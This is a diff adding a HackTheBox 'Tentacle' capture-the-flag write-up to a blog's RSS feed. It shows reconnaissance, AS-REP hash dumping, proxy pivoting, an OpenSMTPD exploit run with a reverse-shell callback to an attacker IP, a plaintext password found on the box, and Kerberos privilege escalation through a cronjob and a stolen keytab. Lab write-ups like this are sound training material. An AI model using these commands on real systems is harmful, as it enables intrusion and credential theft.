@@ -33,6 +33,191 @@
     </item>
     
     <item>
+      <title>HackTheBox - Tentacle Writeup</title>
+      <link>https://mohamed-elleuch.me/writeups/htb-tentacle/</link>
+      <pubDate>Fri, 18 Jun 2021 00:00:00 +0000</pubDate>
+      <guid>https://mohamed-elleuch.me/writeups/htb-tentacle/</guid>
+      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;sudo nmap -sC -sV 10.10.10.224 -v
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;22/tcp   open   ssh          OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)
+|   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)
+|_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)
+53/tcp   open   domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)
+| dns-nsid: 
+|_  bind.version: 9.11.20-RedHat-9.11.20-5.el8
+88/tcp   open   kerberos-sec MIT Kerberos (server time: 2021-06-18 13:07:47Z)
+3128/tcp open   http-proxy   Squid http proxy 4.11
+|_http-server-header: squid/4.11
+|_http-title: ERROR: The requested URL could not be retrieved
+9090/tcp closed zeus-admin
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We have 3 ports open:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;22/ssh : OpenSSH 8.0&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;53/dns : ISC BIND 9.11.20&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;88/kerberos : MIT Kerberos&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;p-stylecolorgreenweb-server-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Web Server &lt;/p&gt;&lt;/h2&gt;
+&lt;img src=&#34;88.png&#34;&gt;
+&lt;p&gt;We get a username and two domain names !&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;j.nakazawa@realcorp.htb
+srv01.realcorp.htb
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Let&amp;rsquo;s add them  to &lt;code&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;
+&lt;img src=&#34;realcorp.png&#34;&gt;
+&lt;img src=&#34;srv.png&#34;&gt;
+&lt;p&gt;Nothing interesting, let&amp;rsquo;s move on&lt;/p&gt;
+&lt;h2 id=&#34;p-stylecolorgreenkerberos-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Kerberos &lt;/p&gt;&lt;/h2&gt;
+&lt;p&gt;We have a valid username and a domain! let&amp;rsquo;s try to dump his KRBASREP5 hash&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py realcorp.htb/j.nakazawa -no-pass
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;kerb.png&#34;&gt;
+&lt;p&gt;But sadly it&amp;rsquo;s uncrackable, let&amp;rsquo;s move on&lt;/p&gt;
+&lt;h2 id=&#34;p-stylecolorgreen-dns-enump&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt; DNS ENUM&lt;/p&gt;&lt;/h2&gt;
+&lt;p&gt;This machine has a DNS and proxy service running, we can guess that it&amp;rsquo;s routing trafics to other machines&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s find out&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;dnsenum --enum --dnsserver 10.10.10.224 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt realcorp.htb
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;dnsenum.png&#34;&gt;
+&lt;p&gt;We have more IPs and domains, but we can&amp;rsquo;t access anyone of them.&lt;/p&gt;
+&lt;p&gt;We&amp;rsquo;ll be using proxychains ( Dynamic chain )&lt;/p&gt;
+&lt;p&gt;We&amp;rsquo;ll be adding these 3 lines to &lt;code&gt;/etc/proxychains.conf&lt;/code&gt; and the domains to &lt;code&gt;/etc/hosts&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;http 10.10.10.224   3128
+http 127.0.0.1      3128
+http 10.197.243.77  3128
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1 id=&#34;p-stylecolorredfoothold-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Foothold &lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;p&gt;Let&amp;rsquo;s first run nmap on the new IPs&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo proxychains4 -f /etc/proxychains.conf nmap -Pn -sT -v 10.197.243.31
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;22/tcp   open  ssh
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+464/tcp  open  kpasswd5
+749/tcp  open  kerberos-adm
+3128/tcp open  squid-http
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;There is a webserver running, let&amp;rsquo;s try to access it&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;proxychains4 -f /etc/proxychains.conf firefox
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;nginx.png&#34;&gt;
+&lt;p&gt;Since this ip is mapped to  &lt;code&gt;wpad.realcorp.htb&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;We can now get the web proxy auto discovery config (wpad.dat)&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;proxychains4 -f /etc/proxychains.conf curl http://wpad.realcorp.htb/wpad.dat
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;wpad.png&#34;&gt;
+&lt;p&gt;We have another network IP &lt;code&gt;10.241.251.0&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;proxychains4 -f /etc/proxychains.conf nmap 10.241.251.0/24 -Pn 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;After waiting a bit, we can get an active host 10.241.251.113&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;proxychains4 -f /etc/proxychains.conf nmap 10.241.251.113 -sV -Pn
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;PORT   STATE SERVICE VERSION
+25/tcp open  smtp    OpenSMTPD
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can grab an exploit from exploitdb&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;I&amp;rsquo;ll be using this exploit : &lt;a href=&#34;https://github.com/QTranspose/CVE-2020-7247-exploit/blob/main/exploit.py&#34;&gt;https://github.com/QTranspose/CVE-2020-7247-exploit/blob/main/exploit.py&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;proxychains4 -f /etc/proxychains.conf python3 exp.py 10.241.251.113 25 10.10.14.68 9001 j.nakazawa@realcorp.htb
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;foothold.png&#34;&gt;
+&lt;p&gt;And we&amp;rsquo;re on the box&lt;/p&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;p-stylecolorred-user-flag-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt; User Flag &lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;p&gt;An interesting file in the user home directory&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Set default values for all following accounts.
+defaults
+auth           on
+tls            on
+tls_trust_file /etc/ssl/certs/ca-certificates.crt
+logfile        /dev/null
+
+# RealCorp Mail
+account        realcorp
+host           127.0.0.1
+port           587
+from           j.nakazawa@realcorp.htb
+user           j.nakazawa
+password       sJB}RM&amp;gt;6Z~64_
+tls_fingerprint	C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60
+
+# Set a default account
+account default : realcorp
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We found a password, but i couldn&amp;rsquo;t ssh into the box with it&lt;/p&gt;
+&lt;p&gt;The trick is to generate a tgs kk
+to ssh into the box&lt;/p&gt;
+&lt;p&gt;But first, we need to edit &lt;code&gt;/etc/krb5.conf&lt;/code&gt;&lt;/p&gt;
+&lt;img src=&#34;kk.png&#34;&gt;
+&lt;blockquote&gt;
+&lt;p&gt;I was stuck at this part for a while trying to figure out what i did wrong, until i gave up and asked someone for a hint &lt;code&gt;dns_canonicalize_hostname = false&lt;/code&gt; was needed&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;And let&amp;rsquo;s generate the ticket&lt;/p&gt;
+&lt;img src=&#34;klist.png&#34;&gt;
+&lt;p&gt;Let&amp;rsquo;s try to ssh as j.nakazawa&lt;/p&gt;
+&lt;img src=&#34;foothold.png&#34;&gt;
+&lt;hr&gt;
+&lt;h1 id=&#34;p-stylecolorredroot-flag-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Root Flag &lt;/p&gt;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;p&gt;After running LinPEAS, we can see that there a cronjob&lt;/p&gt;
+&lt;img src=&#34;cron.png&#34;&gt;
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/bash
+
+/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
+cd /home/admin
+/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
+/usr/bin/rm -f access.log cache.log
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;It copies everything from &lt;code&gt;/var/log/squid/&lt;/code&gt; to &lt;code&gt;/home/admin&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;So the trick is to create &lt;code&gt;.k5login&lt;/code&gt; in &lt;code&gt;/var/log/squid&lt;/code&gt; so it gets copied to the admin&amp;rsquo;s user home directory and we ssh into it&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;img src=&#34;k5.png&#34;&gt;
+&lt;/blockquote&gt;
+&lt;img src=&#34;admin.png&#34;&gt;
+&lt;p&gt;Now we&amp;rsquo;re the admin user&lt;/p&gt;
+&lt;p&gt;Enumerating a bit, we can find someone interesting  &lt;code&gt;/etc/krb5.keytab&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;It&amp;rsquo;s extracted from the KDC database of &amp;ldquo;principals&amp;rdquo; and which contain the encryption key for a service or a host.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img src=&#34;keytab.png&#34;&gt;
+&lt;p&gt;Let&amp;rsquo;s open the kadmin console&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;kadmin -k -t /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;then  add the root as a principal to the database&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-admin/Adding-or-Modifying-Principals.html&#34;&gt;https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-admin/Adding-or-Modifying-Principals.html&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;add_principal root@REALCORP.HTB
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;rootad.png&#34;&gt;
+&lt;p&gt;Now we can get login as root with &lt;code&gt;ksu&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;a href=&#34;https://linux.die.net/man/1/ksu&#34;&gt;https://linux.die.net/man/1/ksu&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img src=&#34;root.png&#34;&gt;
+&lt;p&gt;And we rooted the box!&lt;/p&gt;
+&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
+</description>
+    </item>
+    
+    <item>
       <title>HackTheBox - Tenet Writeup</title>
       <link>https://mohamed-elleuch.me/writeups/htb-tenet/</link>
       <pubDate>Sat, 12 Jun 2021 00:00:00 +0000</pubDate>
